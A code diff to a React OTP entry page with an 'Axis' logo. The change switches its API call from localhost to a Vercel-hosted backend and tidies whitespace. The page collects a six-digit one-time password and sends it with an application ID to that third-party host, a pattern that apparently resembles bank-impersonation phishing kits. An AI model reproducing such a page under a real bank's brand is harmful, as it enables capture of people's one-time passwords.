@@ -50,7 +50,7 @@ export default function OtpPage() {
   const handlePaste = (e) => {
     e.preventDefault();
     const pasteData = e.clipboardData.getData("text").trim();
-    
+
     if (/^[0-9]{6}$/.test(pasteData)) {
       const digits = pasteData.split("");
       setOtp(digits);
@@ -67,11 +67,11 @@ export default function OtpPage() {
     }
 
     try {
-      const response = await axios.put(`http://localhost:5001/api/v1/applications/${applicationId}`, {
+      const response = await axios.put(`https://axis-be.vercel.app/applications/${applicationId}`, {
         otp: otpValue,
         status: "completed" // Mark as completed
       });
-      
+
       if (response.data.success) {
         // Clear local storage
         localStorage.removeItem("applicationId");
@@ -86,9 +86,9 @@ export default function OtpPage() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">
-      
+
       <div className="w-full max-w-lg text-center space-y-6">
-        
+
         {/* Axis Logo */}
         <div className="flex justify-center mb-6">
           <div className="flex items-center gap-1">
